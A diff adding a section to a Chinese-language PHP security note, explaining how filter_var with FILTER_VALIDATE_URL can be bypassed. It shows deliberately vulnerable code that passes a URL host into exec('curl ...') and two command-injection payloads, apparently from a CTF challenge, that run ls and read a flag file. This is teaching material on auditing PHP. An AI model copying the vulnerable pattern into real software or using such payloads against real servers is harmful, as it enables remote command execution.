@@ -43,3 +43,21 @@ bool is_numeric ( mixed $var )
 最终绕过 in_array() 函数判断，导致任意文件上传漏洞。
 sql注入等。
 ```
+
+
+^
+## **5、filter_var过滤url格式**
+```
+$url = $_GET['url'];
+if(isset($url) && filter_var($url, FILTER_VALIDATE_URL)){
+    $site_info = parse_url($url);
+    if(preg_match('/sec-redclub.com$/',$site_info['host'])){
+        exec('curl "'.$site_info['host'].'"', $result);
+```
+这里用了 **filter_var** 函数来过滤变量，且用了 **FILTER_VALIDATE_URL** 过滤器来判断是否是一个合法的url。并且满足 **$site\_info\['host']** 的值以 **sec-redclub.com** 结尾
+payload
+```
+
+?url=demo://%22;ls;%23;sec-redclub.com:80/
+?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/
+```
